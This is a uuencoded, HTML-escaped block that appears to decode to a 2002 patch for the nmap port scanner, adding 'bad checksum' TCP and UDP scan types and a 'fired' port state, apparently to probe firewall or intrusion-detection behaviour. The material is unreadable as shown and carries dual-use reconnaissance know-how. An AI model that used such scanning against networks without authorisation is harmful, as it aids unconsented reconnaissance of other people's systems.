M86L[&quot;B`@(&amp;-A&lt;V4@5TE.1$]77U-#04XZ(&#039;)E=&#039;5R;B`B5VEN9&amp;]W(%-C86XB
M.R!B&lt;F5A:SL*0$`@+3$T.34L-B`K,34P,RPW($!`&quot;B`@(&#039;-W:71C:&quot;AS=&amp;%T
M92D@&gt;PH@(&quot;!C87-E(%!/4E1?3U!%3CH@&lt;F5T=7)N(&quot;)O&lt;&amp;5N(CL@8G)E86L[
M&quot;B`@(&amp;-A&lt;V4@4$]25%]&amp;25)%5T%,3$5$.B!R971U&lt;FX@(F9I;&#039;1E&lt;F5D(CL@
M8G)E86L[&quot;BL@(&amp;-A&lt;V4@4$]25%]&amp;25)%1#H@&lt;F5T=7)N(&quot;)F:7)E9&quot;([(&amp;)R
M96%K.PH@(&quot;!C87-E(%!/4E1?54Y&amp;25)%5T%,3$5$.B!R971U&lt;FX@(E5.9FEL
M=&amp;5R960B.R!B&lt;F5A:SL*(&quot;`@8V%S92!03U)47T-,3U-%1#H@&lt;F5T=7)N(&quot;)C
M;&amp;]S960B.R!B&lt;F5A:SL*(&quot;`@9&amp;5F875L=#H@&lt;F5T=7)N(&quot;)U;FMN;W=N(CL@
M8G)E86L[&quot;F1I9F8@+75R3F(@;FUA&lt;&quot;TS+C$P04Q02$$T+V]U=&#039;!U=&quot;YC8R!N
M;6%P+3,N,3!!3%!(030M8F%D+V]U=&#039;!U=&quot;YC8PHM+2T@;FUA&lt;&quot;TS+C$P04Q0
M2$$T+V]U=&#039;!U=&quot;YC8PE-;VX@4V5P(&quot;`Y(#`W.C4Y.C4Q(#(P,#(**RLK(&amp;YM
M87`M,RXQ,$%,4$A!-&quot;UB860O;W5T&lt;&#039;5T+F-C&quot;51H=2!$96,@,3(@,#&lt;Z,C0Z
M,#,@,C`P,@I`0&quot;`M-#8X+#@@*S0V.&quot;PQ,B!`0`H@(&quot;`@(&amp;1O&lt;V-A;FEN9F\H
M(FUA:6UO;B(L(&quot;)T8W`B+&quot;!S8V%N;&amp;ES=&quot;T^=&amp;-P7W!O&lt;G1S+&quot;!S8V%N;&amp;ES
M=&quot;T^=&amp;-P7V-O=6YT*3L*(&quot;`@:68@*&amp;\N9FEN&lt;V-A;BD@&quot;B`@(&quot;`@9&amp;]S8V%N
M:6YF;R@B9FEN(BP@(G1C&lt;&quot;(L(&#039;-C86YL:7-T+3YT8W!?&lt;&amp;]R=&#039;,L(&#039;-C86YL
M:7-T+3YT8W!?8V]U;G0I.PHK(&quot;!I9B`H;RYB861T8W!S8V%N*0HK(&quot;`@(&amp;1O
M&lt;V-A;FEN9F\H(F)A9&#039;1C&lt;&quot;(L(&quot;)T8W`B+&quot;!S8V%N;&amp;ES=&quot;T^=&amp;-P7W!O&lt;G1S
M+&quot;!S8V%N;&amp;ES=&quot;T^=&amp;-P7V-O=6YT*3L*(&quot;`@:68@*&amp;\N=61P&lt;V-A;BD@&quot;B`@
M(&quot;`@9&amp;]S8V%N:6YF;R@B=61P(BP@(G5D&lt;&quot;(L(&#039;-C86YL:7-T+3YU9&#039;!?&lt;&amp;]R
M=&#039;,L(&#039;-C86YL:7-T+3YU9&#039;!?8V]U;G0I.PHK(&quot;!I9B`H;RYB861U9&#039;!S8V%N
M*0HK(&quot;`@(&amp;1O&lt;V-A;FEN9F\H(F)A9&#039;5D&lt;&quot;(L(&quot;)U9&#039;`B+&quot;!S8V%N;&amp;ES=&quot;T^
M=61P7W!O&lt;G1S+&quot;!S8V%N;&amp;ES=&quot;T^=61P7V-O=6YT*3L*(&quot;`@:68@*&amp;\N:7!P
M&lt;F]T&lt;V-A;BD@&quot;B`@(&quot;`@9&amp;]S8V%N:6YF;R@B:7!P&lt;F]T;R(L(&quot;)I&lt;&quot;(L(&#039;-C
M86YL:7-T+3YP&lt;F]T&lt;RP@&lt;V-A;FQI&lt;W0M/G!R;W1?8V]U;G0I.R`*(&#039;T*9&amp;EF
M9B`M=7).8B!N;6%P+3,N,3!!3%!(030O&lt;&amp;]R=&amp;QI&lt;W0N8V,@;FUA&lt;&quot;TS+C$P
M04Q02$$T+6)A9&quot;]P;W)T;&amp;ES=&quot;YC8PHM+2T@;FUA&lt;&quot;TS+C$P04Q02$$T+W!O
M&lt;G1L:7-T+F-C&quot;4UO;B!.;W8@,3$@,3@Z,#,Z-#4@,C`P,@HK*RL@;FUA&lt;&quot;TS
M+C$P04Q02$$T+6)A9&quot;]P;W)T;&amp;ES=&quot;YC8PE4:&#039;4@1&amp;5C(#$R(#`X.C0T.C(T
M(#(P,#(*0$`@+3@U+#&lt;@*S@U+#&lt;@0$`*(`H@+RH@36%K92!S=7)E(&#039;-T871E
M(&amp;ES($]+(&quot;HO&quot;B`@(&amp;EF(&quot;AS=&amp;%T92`A/2!03U)47T]014X@)B8@&lt;W1A=&amp;4@
M(3T@4$]25%]#3$]3140@)B8@&lt;W1A=&amp;4@(3T@4$]25%]&amp;25)%5T%,3$5$(&quot;8F
M&quot;BT@(&quot;`@(&quot;!S=&amp;%T92`A/2!03U)47U5.1DE215=!3$Q%1&quot;D**R`@(&quot;`@(&#039;-T
M871E(&quot;$](%!/4E1?54Y&amp;25)%5T%,3$5$(&quot;8F(&#039;-T871E(&quot;$](%!/4E1?1DE2
M140@*0H@(&quot;`@(&amp;9A=&amp;%L*&quot;)A9&amp;1P;W)T.B!A=&#039;1E;7!T(&#039;1O(&amp;%D9&quot;!P;W)T
M(&amp;YU;6)E&lt;B`E9&quot;!W:71H(&amp;EL;&amp;5G86P@&lt;W1A=&amp;4@)61&lt;;B(L(&#039;!O&lt;G1N;RP@
M&lt;W1A=&amp;4I.PH@&quot;B`@(&amp;EF(&quot;AP&lt;F]T;V-O;&quot;`]/2!)4%!23U1/7U1#4&quot;D@&gt;PI`
M0&quot;`M,C8Q+#$R(&quot;LR-C$L,38@0$`*(`H@(&quot;!I9B`H&lt;&amp;QI&lt;W0M/G-T871E7V-O
M=6YT&lt;UM03U)47T9)4D5704Q,141=(#X@,3`@*R`*(&quot;`@(&quot;`@($U!6&quot;AP;&amp;ES
M=&quot;T^&lt;W1A=&amp;5?8V]U;G1S6U!/4E1?54Y&amp;25)%5T%,3$5$72P@&quot;BT)(&quot;!P;&amp;ES
M=&quot;T^&lt;W1A=&amp;5?8V]U;G1S6U!/4E1?0TQ/4T5$72DI(&#039;L**PD@(&#039;!L:7-T+3YS
M=&amp;%T95]C;W5N=&#039;-;4$]25%]#3$]3141=*W!L:7-T+3YS=&amp;%T95]C;W5N=&#039;-;
M4$]25%]&amp;25)%1%TI*2![&quot;B`@(&quot;`@&lt;&amp;QI&lt;W0M/FEG;F]R961?&lt;&amp;]R=%]S=&amp;%T
M92`](%!/4E1?1DE215=!3$Q%1#L*(&quot;`@?2!E;&#039;-E(&amp;EF(&quot;AP;&amp;ES=&quot;T^&lt;W1A
M=&amp;5?8V]U;G1S6U!/4E1?54Y&amp;25)%5T%,3$5$72`^(`HM&quot;2`@(&quot;`@&lt;&amp;QI&lt;W0M
M/G-T871E7V-O=6YT&lt;UM03U)47T-,3U-%1%TI(&#039;L**PD@(&quot;`@(&#039;!L:7-T+3YS
M=&amp;%T95]C;W5N=&#039;-;4$]25%]#3$]3141=*W!L:7-T+3YS=&amp;%T95]C;W5N=&#039;-;
M4$]25%]&amp;25)%1%TI(&#039;L*(&quot;`@(&quot;!P;&amp;ES=&quot;T^:6=N;W)E9%]P;W)T7W-T871E
M(#T@4$]25%]53D9)4D5704Q,140[&quot;BT@(&#039;T@96QS92!P;&amp;ES=&quot;T^:6=N;W)E
M9%]P;W)T7W-T871E(#T@4$]25%]#3$]3140[&quot;BL@(&#039;T@96QS92!I9B`H&lt;&amp;QI
M&lt;W0M/G-T871E7V-O=6YT&lt;UM03U)47T9)4D5$72`^(&#039;!L:7-T+3YS=&amp;%T95]C
M;W5N=&#039;-;4$]25%]#3$]3141=*2![&quot;BL@(&quot;`@&lt;&amp;QI&lt;W0M/FEG;F]R961?&lt;&amp;]R
M=%]S=&amp;%T92`](%!/4E1?1DE2140[&quot;BL@(&#039;T@96QS92![&quot;BL@(&quot;`@&lt;&amp;QI&lt;W0M
M/FEG;F]R961?&lt;&amp;]R=%]S=&amp;%T92`](%!/4E1?0TQ/4T5$.PHK(&quot;!](&quot;`*(&#039;T*
M(`H@&quot;F1I9F8@+75R3F(@;FUA&lt;&quot;TS+C$P04Q02$$T+W!O&lt;G1L:7-T+F@@;FUA
M&lt;&quot;TS+C$P04Q02$$T+6)A9&quot;]P;W)T;&amp;ES=&quot;YH&quot;BTM+2!N;6%P+3,N,3!!3%!(
M030O&lt;&amp;]R=&amp;QI&lt;W0N:`E4=64@075G(#(W(#(Q.C0S.C(S(#(P,#(**RLK(&amp;YM
M87`M,RXQ,$%,4$A!-&quot;UB860O&lt;&amp;]R=&amp;QI&lt;W0N:`E4:&#039;4@1&amp;5C(#$R(#`W.C(W
M.C0W(#(P,#(*0$`@+34W+#&lt;@*S4W+#@@0$`*(&quot;-D969I;F4@4$]25%]415-4
M24Y&#039;(#0*(&quot;-D969I;F4@4$]25%]&amp;4D532&quot;`U&quot;B`C9&amp;5F:6YE(%!/4E1?54Y&amp;
M25)%5T%,3$5$(#8*+2-D969I;F4@4$]25%](24=(15-47U-4051%(#&lt;@+RH@
M*BHJ24U03U)404Y4(&quot;TM($)535`@5$A)4R!54&quot;!72$5.(%-4051%4R!!4D4@
M&quot;BLC9&amp;5F:6YE(%!/4E1?1DE2140@-PHK(V1E9FEN92!03U)47TA)1TA%4U1?
M4U1!5$4@.&quot;`O*B`J*BI)35!/4E1!3E0@+2T@0E5-4&quot;!42$E3(%50(%=(14X@
M4U1!5$53($%212`*(`D)&quot;0E!1$1%1&quot;`J*BH@*B\*(&quot;`*(&quot;-D969I;F4@0T].
M1E].3TY%(#`*9&amp;EF9B`M=7).8B!N;6%P+3,N,3!!3%!(030O&lt;V-A;E]E;F=I
M;F4N8V,@;FUA&lt;&quot;TS+C$P04Q02$$T+6)A9&quot;]S8V%N7V5N9VEN92YC8PHM+2T@
M;FUA&lt;&quot;TS+C$P04Q02$$T+W-C86Y?96YG:6YE+F-C&quot;4UO;B!397`@,38@,#0Z
M,SDZ-3@@,C`P,@HK*RL@;FUA&lt;&quot;TS+C$P04Q02$$T+6)A9&quot;]S8V%N7V5N9VEN
M92YC8PE-;VX@1&amp;5C(#$V(#(R.C0V.C`S(#(P,#(*0$`@+3$S,CDL.&quot;`K,3,R
M.2PY($!`&quot;B`@(&amp;5L&lt;V4@:68@*&#039;-C86YT&gt;7!E(#T](%A-05-?4T-!3BD@&lt;V-A
M;F9L86=S(#T@5$A?1DE.?%1(7U521WQ42%]055-(.PH@(&quot;!E;&#039;-E(&amp;EF(&quot;AS
M8V%N=&#039;EP92`]/2!.54Q,7U-#04XI(&#039;-C86YF;&amp;%G&lt;R`](#`[&quot;B`@(&amp;5L&lt;V4@
M:68@*&#039;-C86YT&gt;7!E(#T]($9)3E]30T%.*2!S8V%N9FQA9W,@/2!42%]&amp;24X[
M&quot;BL@(&amp;5L&lt;V4@:68@*&#039;-C86YT&gt;7!E(#T]($)!1%1#4%]30T%.*2!S8V%N9FQA
M9W,@/2!42%]364X[&quot;B`@(&amp;5L&lt;V4@:68@*&#039;-C86YT&gt;7!E(#T]($U!24U/3E]3
M0T%.*2!S8V%N9FQA9W,@/2!42%]&amp;24Y\5$A?04-+.PHM(&quot;!E;&#039;-E(&amp;EF(&quot;AS
M8V%N=&#039;EP92`A/2!51%!?4T-!3B`F)B!S8V%N=&#039;EP92`A/2!)4%!23U1?4T-!
M3BD@&gt;PHK(&quot;!E;&#039;-E(&amp;EF(&quot;AS8V%N=&#039;EP92$]54107U-#04X@)B8@&lt;V-A;G1Y
M&lt;&amp;4A/4E04%)/5%]30T%.(&quot;8F(&#039;-C86YT&gt;7!E(3U&quot;04151%!?4T-!3BD@&gt;PH@
M(&quot;`@(&amp;9A=&amp;%L*&quot;)5;FMN;W=N(&#039;-C86X@=&#039;EP92!F;W(@&lt;W5P97)?&lt;V-A;B(I
M.R!]&quot;B`*(&quot;`@&lt;W1A&lt;G1T:6UE(#T@=&amp;EM92A.54Q,*3L*0$`@+3$S.3$L-R`K
M,3,Y,BPW($!`&quot;B`)&quot;6YO=R`](&amp;-U&lt;G)E;G0M/G-E;G1;,5T[&quot;B`)&quot;6EF(&quot;AO
M+F9R86=S8V%N*0H@&quot;0D@(&#039;-E;F1?&lt;VUA;&amp;Q?9G)A9WI?9&amp;5C;WES*&#039;)A=W-D
M+&quot;!T87)G970M/G8T:&amp;]S=&amp;EP*&quot;DL(#`L:2P@8W5R&lt;F5N=&quot;T^&lt;&amp;]R=&amp;YO+&quot;!S
M8V%N9FQA9W,I.PHM&quot;0EE;&#039;-E(&amp;EF(&quot;AS8V%N=&#039;EP92`]/2!51%!?4T-!3BD*
M*PD)96QS92!I9B`H&lt;V-A;G1Y&lt;&amp;4]/55$4%]30T%.(&#039;Q\(&#039;-C86YT&gt;7!E/3U&quot;
M04151%!?4T-!3BD*(`D)(&quot;!S96YD7W5D&lt;%]R87=?9&amp;5C;WES*&#039;)A=W-D+&quot;!T
M87)G970M/G8T:&amp;]S=&amp;EP*&quot;DL(&amp;DL&quot;B`)&quot;0D)(&quot;`@(&quot;`@8W5R&lt;F5N=&quot;T^&lt;&amp;]R
M=&amp;YO+&quot;!O+F5X=&#039;)A7W!A&gt;6QO860L(&amp;\N97AT&lt;F%?&lt;&amp;%Y;&amp;]A9%]L96YG=&amp;@I
M.PH@&quot;0EE;&#039;-E(&amp;EF(&quot;AS8V%N=&#039;EP92`]/2!)4%!23U1?4T-!3BD*0$`@+3$T
M,#$L-R`K,30P,BPW($!`&quot;B`)&quot;0D)(&quot;`@(&quot;`@8W5R&lt;F5N=&quot;T^&lt;&amp;]R=&amp;YO+&quot;`P
M+&quot;`P+&quot;!S8V%N9FQA9W,L(#`L($Y53$PL(#`L&quot;B`)&quot;0D)(&quot;`@(&quot;`@;RYE&gt;&#039;1R
M85]P87EL;V%D+&quot;!O+F5X=&#039;)A7W!A&gt;6QO861?;&amp;5N9W1H*3L*(`D):68@*&#039;-E
M;F1D96QA&gt;2`F)@HM&quot;0D@(&quot;`@*&#039;-C86YT&gt;7!E(#T](%5$4%]30T%.(&#039;Q\(&#039;-C
M86YT&gt;7!E(#T]($E04%)/5%]30T%.*2D**PD)(&quot;`@(&quot;AS8V%N=&#039;EP93T]5410
M7U-#04X@?&#039;P@&lt;V-A;G1Y&lt;&amp;4]/4)!1%5$4%]30T%.(&#039;Q\(&#039;-C86YT&gt;7!E/3U)
M4%!23U1?4T-!3BDI&quot;B`)&quot;2`@=7-L965P*&#039;-E;F1D96QA&gt;2D[&quot;B`)(&quot;`@(&quot;`@
M?0H@&quot;2`@(&quot;!]&quot;D!`(&quot;TQ-#(P+#&lt;@*S$T,C$L-R!`0`H@&quot;2`@(&quot;!G971T:6UE
M;V9D87DH)F-U&lt;G)E;G0M/G-E;G1;,%TL($Y53$PI.PH@&quot;2`@(&quot;!I9B`H;RYF
M&lt;F%G&lt;V-A;BD*(`D@(&quot;`@(&quot;!S96YD7W-M86QL7V9R86=Z7V1E8V]Y&lt;RAR87=S
M9&quot;P@=&amp;%R9V5T+3YV-&amp;AO&lt;W1I&lt;&quot;@I+&quot;`P+&quot;!O+FUA9VEC7W!O&lt;G0L(&amp;-U&lt;G)E
M;G0M/G!O&lt;G1N;RP@&lt;V-A;F9L86=S*3L*+0D@(&quot;`@96QS92!I9B`H&lt;V-A;G1Y
M&lt;&amp;4@/3T@54107U-#04XI&quot;BL)(&quot;`@(&amp;5L&lt;V4@:68@*&#039;-C86YT&gt;7!E/3U51%!?
M4T-!3B!\?&quot;!S8V%N=&#039;EP93T]0D%$54107U-#04XI&quot;B`)(&quot;`@(&quot;`@&lt;V5N9%]U
M9&#039;!?&lt;F%W7V1E8V]Y&lt;RAR87=S9&quot;P@=&amp;%R9V5T+3YV-&amp;AO&lt;W1I&lt;&quot;@I+&quot;!O+FUA
M9VEC7W!O&lt;G0L&quot;B`)&quot;0D)(&quot;!C=7)R96YT+3YP;W)T;F\L(&amp;\N97AT&lt;F%?&lt;&amp;%Y
M;&amp;]A9&quot;P@;RYE&gt;&#039;1R85]P87EL;V%D7VQE;F=T:&quot;D[&quot;B`)(&quot;`@(&amp;5L&lt;V4@:68@
M*&#039;-C86YT&gt;7!E(#T]($E04%)/5%]30T%.*0I`0&quot;`M,30S,&quot;PW(&quot;LQ-#,Q+#&lt;@
M0$`*(`D@(&quot;`@(&quot;!S96YD7W1C&lt;%]R87=?9&amp;5C;WES*&#039;)A=W-D+&quot;!T87)G970M
M/G8T:&amp;]S=&amp;EP*&quot;DL(&amp;\N;6%G:6-?&lt;&amp;]R=&quot;P@&quot;B`)&quot;0D)(&quot;!C=7)R96YT+3YP
M;W)T;F\L(#`L(#`L(&#039;-C86YF;&amp;%G&lt;RP@,&quot;P@3E5,3&quot;P@,&quot;P*(`D)&quot;0D@(&amp;\N
M97AT&lt;F%?&lt;&amp;%Y;&amp;]A9&quot;P@;RYE&gt;&#039;1R85]P87EL;V%D7VQE;F=T:&quot;D[&quot;BT)(&quot;`@
M(&amp;EF(&quot;@H&lt;V-A;G1Y&lt;&amp;4@/3T@54107U-#04X@?&#039;P@&lt;V-A;G1Y&lt;&amp;4@/3T@25!0
M4D]47U-#04XI(&quot;8F&quot;BL)(&quot;`@(&amp;EF(&quot;@H&lt;V-A;G1Y&lt;&amp;4]/55$4%]30T%.(&#039;Q\
M(&#039;-C86YT&gt;7!E/3U&quot;04151%!?4T-!3B!\?&quot;!S8V%N=&#039;EP93T]25!04D]47U-#
M04XI(&quot;8F&quot;B`)&quot;7-E;F1D96QA&gt;2D*(`D@(&quot;`@(&quot;!U&lt;VQE97`H&lt;V5N9&amp;1E;&amp;%Y
M*3L*(`D@(&#039;T*0$`@+3$T-C0L-B`K,30V-2PY($!`&quot;B`)(&quot;`@(&quot;`@:68@*&amp;EP
M+3YI&lt;%]P(#T]($E04%)/5$]?5$-0*2![&quot;B`)&quot;71C&lt;&quot;`](&quot;AS=&#039;)U8W0@=&amp;-P
M:&amp;1R(&quot;HI(&quot;@H*&amp;-H87(@*BD@:7`I(&quot;L@-&quot;`J(&amp;EP+3YI&lt;%]H;&quot;D[&quot;B`)&quot;6EF
M(&quot;AT8W`M/G1H7V9L86=S(&quot;8@5$A?4E-4*2![&quot;2`@(&quot;`**PD)(&quot;!I9B`H&lt;V-A
M;G1Y&lt;&amp;4@/3T@0D%$5$-07U-#04XI&quot;BL)&quot;2`@(&quot;!N97=S=&amp;%T92`](%!/4E1?
M1DE2140[&quot;BL)&quot;2`@96QS90H@&quot;0D@(&amp;YE=W-T871E(#T@4$]25%]#3$]3140[
M&quot;B`)&quot;2`@;F5W&lt;&amp;]R=&quot;`](&amp;YT;VAS*&#039;1C&lt;&quot;T^=&amp;A?&lt;W!O&lt;G0I.PH@&quot;0D@(&amp;EF
M(&quot;AP;W)T;&amp;]O:W5P6VYE=W!O&lt;G1=(#P@,&quot;D@&gt;PI`0&quot;`M,34S-&quot;PV(&quot;LQ-3,X
M+#@@0$`*(`D)(&quot;!C87-E(#(Z(&quot;\J(&#039;!R,&#039;0P8S!L(&#039;5N&lt;F5A8VAA8FQE(&quot;HO
M&quot;B`)&quot;2`@(&quot;!I9B`H&lt;V-A;G1Y&lt;&amp;4@/3T@25!04D]47U-#04XI(&#039;L*(`D)(&quot;`@
M(&quot;`@;F5W&lt;W1A=&amp;4@/2!03U)47T-,3U-%1#L**PD)(&quot;`@(&#039;T@96QS92!I9B`H
M&lt;V-A;G1Y&lt;&amp;4]/4)!1%5$4%]30T%.(&#039;Q\(&#039;-C86YT&gt;7!E/3U&quot;04140U!?4T-!
M3BD@&gt;PHK&quot;0D@(&quot;`@(&quot;`@(&amp;YE=W-T871E(#T@4$]25%]&amp;25)%1#L*(`D)(&quot;`@
M(&#039;T@96QS90H@&quot;0D@(&quot;`@(&quot;!N97=S=&amp;%T92`](%!/4E1?1DE215=!3$Q%1#L*
M(`D)(&quot;`@(&amp;)R96%K.PI`0&quot;`M,34T,2PQ,B`K,34T-RPQ.&quot;!`0`H@&quot;0D@(&amp;-A
M&lt;V4@,SH@+RH@&lt;#!R=&quot;!U;G)E86-H86)L92`J+PD)&quot;B`)&quot;2`@(&quot;!I9B`H&lt;V-A
M;G1Y&lt;&amp;4@/3T@54107U-#04XI(&#039;L*(`D)(&quot;`@(&quot;`@;F5W&lt;W1A=&amp;4@/2!03U)4
M7T-,3U-%1#L*+0D)(&quot;`@(&#039;T@96QS92!N97=S=&amp;%T92`](%!/4E1?1DE215=!
M3$Q%1#L**PD)(&quot;`@(&#039;T@96QS92!I9B`H&lt;V-A;G1Y&lt;&amp;4]/4)!1%5$4%]30T%.
M(&#039;Q\(&#039;-C86YT&gt;7!E/3U&quot;04140U!?4T-!3BD@&gt;PHK&quot;0D@(&quot;`@(&quot;`@(&amp;YE=W-T
M871E(#T@4$]25%]&amp;25)%1#L**PD)(&quot;`@(&#039;T@96QS90HK&quot;0D@(&quot;`@(&quot;`@(&amp;YE
M=W-T871E(#T@4$]25%]&amp;25)%5T%,3$5$.PH@&quot;0D@(&quot;`@8G)E86L[&quot;B`)&quot;2`@
M&quot;B`)&quot;2`@8V%S92`Y.@H@&quot;0D@(&amp;-A&lt;V4@,3`Z&quot;B`)&quot;2`@8V%S92`Q,SH@+RH@
M061M:6YI&lt;W1R871I=F5L&gt;2!P&lt;F]H:6)I=&amp;5D(&#039;!A8VME=&quot;`J+PHK&quot;0D@(&quot;`@
M:68@*&#039;-C86YT&gt;7!E/3U&quot;04151%!?4T-!3B!\?&quot;!S8V%N=&#039;EP93T]0D%$5$-0
M7U-#04XI&quot;BL)&quot;2`@(&quot;`@(&amp;YE=W-T871E(#T@4$]25%]&amp;25)%1#L**PD)(&quot;`@
M(&amp;5L&lt;V4*(`D)(&quot;`@(&amp;YE=W-T871E(#T@4$]25%]&amp;25)%5T%,3$5$.PH@&quot;0D@
M(&quot;`@8G)E86L[&quot;0D*(`D)(&quot;`*0$`@+3$U-S(L-R`K,34X-&quot;PW($!`&quot;B`)(&quot;`@
M(&quot;`@?0H@&quot;2`@(&quot;`*(`D@(&quot;`@(&quot;!I9B`H8W5R&lt;F5N=&quot;D@&gt;PD@(`HM&quot;0EI9B`H
M8W5R&lt;F5N=&quot;T^&lt;W1A=&amp;4@/3T@4$]25%]#3$]3140@)B8@*&#039;!A8VME=%]T&lt;GEN
M=6T@/&quot;`P*2D@&gt;PHK&quot;0EI9B`H*&amp;-U&lt;G)E;G0M/G-T871E/3U03U)47T-,3U-%
M1&quot;!\?&quot;!C=7)R96YT+3YS=&amp;%T93T]4$]25%]&amp;25)%1&quot;D@)B8@*&#039;!A8VME=%]T
M&lt;GEN=6T@/&quot;`P*2D@&gt;PH@&quot;0D@(&#039;1A&lt;F=E=&quot;T^=&amp;\N&lt;G1T=F%R(#T@*&amp;EN=&quot;D@
M*&#039;1A&lt;F=E=&quot;T^=&amp;\N&lt;G1T=F%R(&quot;H@,2XR*3L*(`D)(&quot;!I9B`H;RYD96)U9V=I
M;F&lt;I(&#039;L@;&amp;]G7W=R:71E*$Q/1U]35$1/550L(&quot;),871E(&#039;!A8VME=&quot;P@8V]U
M;&amp;1N)W0@9FEG=7)E(&amp;]U=&quot;!S96YD;F\@&lt;V\@=V4@9&amp;\@=F%R:6%N8V5I;F-R
M96%S92!T;R`E9%QN(BP@=&amp;%R9V5T+3YT;RYR=&#039;1V87(I.R`*(`D)(&quot;!]&quot;D!`
M(&quot;TQ-3@X+#&lt;@*S$V,#`L-R!`0`H@&quot;0D@(&quot;`@(&quot;!I9B`H(7-E;F1D96QA&gt;2D@
M&lt;V5N9&amp;1E;&amp;%Y(#T@-3`P,#`[&quot;B`)&quot;2`@(&quot;`@(&amp;5L&lt;V4@&lt;V5N9&amp;1E;&amp;%Y(#T@
M34E.*&#039;-E;F1D96QA&gt;2`J(#(L(#$P,#`P,#`I.PH@&quot;0D@(&quot;`@(&quot;!I9B`H&lt;V5N
M9&amp;1E;&amp;%Y(#X](#(P,#`P,&quot;`F)@HM&quot;0D)(&quot;`H&lt;V-A;G1Y&lt;&amp;4@/3T@54107U-#
M04X@?&#039;P@&lt;V-A;G1Y&lt;&amp;4@/3T@25!04D]47U-#04XI*0HK&quot;0D)(&quot;`H&lt;V-A;G1Y
M&lt;&amp;4]/55$4%]30T%.(&#039;Q\(&#039;-C86YT&gt;7!E/3U&quot;04151%!?4T-!3B!\?&quot;!S8V%N
M=&#039;EP93T]25!04D]47U-#04XI*0H@&quot;0D);6%X7W=I9&#039;1H(#T@34E.*&amp;UA&gt;%]W
M:61T:&quot;PR*3L*(`D)(&quot;`@(&quot;`@9G)E&lt;VAP;W)T&lt;W1R:65D(#T@,#L*(`D)(&quot;`@
M(&quot;`@9&#039;)O&lt;&#039;!E9&quot;`](#`[&quot;D!`(&quot;TQ-3DY+#&lt;@*S$V,3$L-R!`0`H@&quot;0D@(&quot;`@
M(&quot;!N=6UQ=65R:65S7VED96%L(#T@34%8*&amp;UI;E]W:61T:&quot;P@;G5M&lt;75E&lt;FEE
M&lt;U]I9&amp;5A;&quot;`J(&amp;9A;&amp;QB86-K7W!E&lt;F-E;G0I.PH@&quot;0D@(&quot;`@(&quot;!I9B`H;RYD
M96)U9V=I;F&lt;I(&#039;L@;&amp;]G7W=R:71E*$Q/1U]35$1/550L(&quot;),;W-T(&amp;$@&lt;&amp;%C
M:V5T+&quot;!D96-R96%S:6YG(&#039;=I;F1O=R!T;R`E9%QN(BP@*&amp;EN=&quot;D@;G5M&lt;75E
M&lt;FEE&lt;U]I9&amp;5A;&quot;D[&quot;B`)&quot;2`@(&quot;`@(&#039;=I;F1O=V1E8W)E87-E*RL[&quot;BT)&quot;2`@
M(&quot;`@(&amp;EF(&quot;AS8V%N=&#039;EP92`]/2!51%!?4T-!3B!\?&quot;!S8V%N=&#039;EP92`]/2!)
M4%!23U1?4T-!3BD**PD)(&quot;`@(&quot;`@:68@*&#039;-C86YT&gt;7!E/3U51%!?4T-!3B!\
M?&quot;!S8V%N=&#039;EP93T]0D%$54107U-#04X@?&#039;P@&lt;V-A;G1Y&lt;&amp;4]/4E04%)/5%]3
M0T%.*0H@&quot;0D)=7-L965P*#(U,#`P,&quot;D[&quot;B`)&quot;2`@(&quot;`@(&#039;T*(`D)(&quot;`@(&#039;T@
M96QS92!I9B`H;RYD96)U9V=I;F&lt;@/B`Q*2![(`I`0&quot;`M,38Q,&quot;PW(&quot;LQ-C(R
M+#&lt;@0$`*(`D):68@*&amp;-U&lt;G)E;G0M/G-T871E(&quot;$](&amp;YE=W-T871E*2![&quot;B`)
M&quot;2`@8VAA;F=E9&quot;LK.PH@&quot;0E]&quot;BT)&quot;6EF(&quot;AC=7)R96YT+3YS=&amp;%T92`A/2!0
M3U)47T]014X@)B8@&quot;BL)&quot;6EF(&quot;AC=7)R96YT+3YS=&amp;%T92`A/2!03U)47T]0
M14X@)B8@8W5R&lt;F5N=&quot;T^&lt;W1A=&amp;4@(3T@4$]25%]&amp;25)%1&quot;`F)B`*(`D)(&quot;`@
M(&amp;-U&lt;G)E;G0M/G-T871E(&quot;$](%!/4E1?0TQ/4T5$*2![&quot;2`@(&quot;`*(`D)(&quot;!N
M=6UQ=65R:65S7V]U=&#039;-T86YD:6YG+2T[&quot;B`)&quot;7T*0$`@+3$V,C,L-R`K,38S
M-2PW($!`&quot;B`)&quot;6-U&lt;G)E;G0M/FYE&gt;&#039;0@/2!C=7)R96YT+3YP&lt;F5V(#T@+3$[
M&quot;B`)&quot;6-U&lt;G)E;G0M/G-T871E(#T@;F5W&lt;W1A=&amp;4[&quot;B`)&quot;6%D9&#039;!O&lt;G0H)G1A
M&lt;F=E=&quot;T^&lt;&amp;]R=&#039;,L(&amp;-U&lt;G)E;G0M/G!O&lt;G1N;RP@&quot;BT)&quot;0DH&lt;V-A;G1Y&lt;&amp;4@
M/3T@54107U-#04XI/R!)4%!23U1/7U5$4&quot;`Z&quot;BL)&quot;0DH&lt;V-A;G1Y&lt;&amp;4]/55$
M4%]30T%.(&#039;Q\(&#039;-C86YT&gt;7!E/3U&quot;04151%!?4T-!3BD_($E04%)/5$]?5410
M(#H*(`D)&quot;2`@*&#039;-C86YT&gt;7!E(#T]($E04%)/5%]30T%./R!)4%!23U1/7TE0
M.B!)4%!23U1/7U1#4&quot;DL(`H@&quot;0D)3E5,3&quot;P@8W5R&lt;F5N=&quot;T^&lt;W1A=&amp;4I.PH@
M&quot;2`@(&quot;`@(&#039;T*0$`@+3$V,S@L-B`K,38U,&quot;PY($!`&quot;B`@(&quot;`@(&quot;!C=7)R96YT
M+3YS=&amp;%T92`](%!/4E1?1E)%4T@[&quot;B`@(&quot;`@(&quot;!C=7)R96YT+3YT&lt;GEN=6T@
M/2`P.PH@(&quot;`@(&quot;`@:68@*&amp;\N9&amp;5B=6=G:6YG*2![(`HK(&quot;`@(&quot;`@(&quot;!I9B`H
M;RYB861C:W-U;3T],2D**PD@(&amp;QO9U]W&lt;FET92A,3T=?4U1$3U54+&quot;`B54YF
M:6QT97)E9&quot;!P;W)T(&quot;5L=2!N;W1E9%QN(BP@8W5R&lt;F5N=&quot;T^&lt;&amp;]R=&amp;YO*3L@
M&quot;BL)96QS92`*(`EL;V=?=W)I=&amp;4H3$]&#039;7U-41$]55&quot;P@(E!R97!A&lt;FEN9R!F
M;W(@&lt;F5T&lt;GDL(&amp;]P96X@&lt;&amp;]R=&quot;`E;&#039;4@;F]T961&lt;;B(L(&amp;-U&lt;G)E;G0M/G!O
